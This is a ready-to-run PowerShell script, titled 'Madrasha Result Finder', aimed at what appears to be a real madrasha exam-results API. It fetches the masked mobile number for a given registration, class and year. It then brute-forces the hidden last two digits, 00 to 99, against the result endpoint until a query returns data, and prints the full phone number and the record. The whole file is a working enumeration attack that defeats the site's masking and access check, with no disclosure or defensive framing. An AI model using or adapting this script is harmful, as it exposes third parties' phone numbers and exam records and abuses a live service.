# check_mobile.ps1
# PowerShell script to find full mobile number from API

Clear-Host

Write-Host "=====================================" -ForegroundColor Cyan
Write-Host "   Madrasha Result Finder" -ForegroundColor Cyan
Write-Host "=====================================" -ForegroundColor Cyan
Write-Host ""

# Prompt user for input
$melhaq = Read-Host "Enter melhaq (e.g. g-1/1473)"
$class  = Read-Host "Enter class (e.g. 5)"
$years  = Read-Host "Enter year (e.g. 2025)"

Write-Host ""
Write-Host "Getting masked mobile number..." -ForegroundColor Yellow
Write-Host ""

# URL-encode melhaq
$encodedMelhaq = [System.Uri]::EscapeDataString($melhaq)

# Step 1: Get masked mobile prefix
$validationUrl = "https://api.wifaqresult.com/madrasha-validation?melhaq=$encodedMelhaq&class=$class&years=$years"

try {
    $validationResponse = Invoke-RestMethod `
        -Uri $validationUrl `
        -Method Get `
        -ErrorAction Stop
}
catch {
    Write-Host "ERROR: Failed to reach validation API" -ForegroundColor Red
    Write-Host $_.Exception.Message -ForegroundColor Red
    Read-Host "Press Enter to exit"
    exit
}

# Extract 9-digit prefix before XX
$mobilePrefix = $null

if ($validationResponse.data -match '^([0-9]{9})XX$') {
    $mobilePrefix = $matches[1]

    Write-Host "Mobile prefix found: ${mobilePrefix}XX" -ForegroundColor Green
}
else {
    Write-Host "ERROR: Could not extract mobile prefix from response." -ForegroundColor Red
    Write-Host "Response was:"
    $validationResponse | ConvertTo-Json -Depth 10

    Read-Host "Press Enter to exit"
    exit
}

Write-Host ""
Write-Host "Trying all last 2 digits (00-99)..." -ForegroundColor Yellow
Write-Host ""

$found = $false

# Step 2: Try 00 through 99
for ($i = 0; $i -le 99; $i++) {

    # Convert number to exactly 2 digits
    $suffix = "{0:D2}" -f $i

    # Build complete mobile number
    $mobile = "$mobilePrefix$suffix"

    Write-Host "Trying $mobile ..."

    $resultUrl = "https://api.wifaqresult.com/madrasha-result?melhaq=$encodedMelhaq&class=$class&mobile=$mobile&years=$years"

    try {
        $response = Invoke-RestMethod `
            -Uri $resultUrl `
            -Method Get `
            -ErrorAction Stop
    }
    catch {
        Write-Host "  Warning: API error for $mobile" -ForegroundColor Yellow
        continue
    }

    # API returns {"data":[] } when the mobile is wrong
    # A valid mobile should return non-empty data
    if ($null -ne $response.data) {

        $hasData = $false

        if ($response.data -is [System.Array]) {
            $hasData = $response.data.Count -gt 0
        }
        elseif ($response.data -is [string]) {
            $hasData = -not [string]::IsNullOrWhiteSpace($response.data)
        }
        else {
            $hasData = $true
        }

        if ($hasData) {
            Write-Host ""
            Write-Host "=====================================" -ForegroundColor Green
            Write-Host "  SUCCESS!" -ForegroundColor Green
            Write-Host "  Full Mobile: $mobile" -ForegroundColor Green
            Write-Host "=====================================" -ForegroundColor Green
            Write-Host ""
            Write-Host "Response:" -ForegroundColor Cyan
            $response | ConvertTo-Json -Depth 10

            $found = $true
            break
        }
    }
}

if (-not $found) {
    Write-Host ""
    Write-Host "No matching mobile number found after trying 00-99." -ForegroundColor Red
}

Write-Host ""
Read-Host "Press Enter to exit"
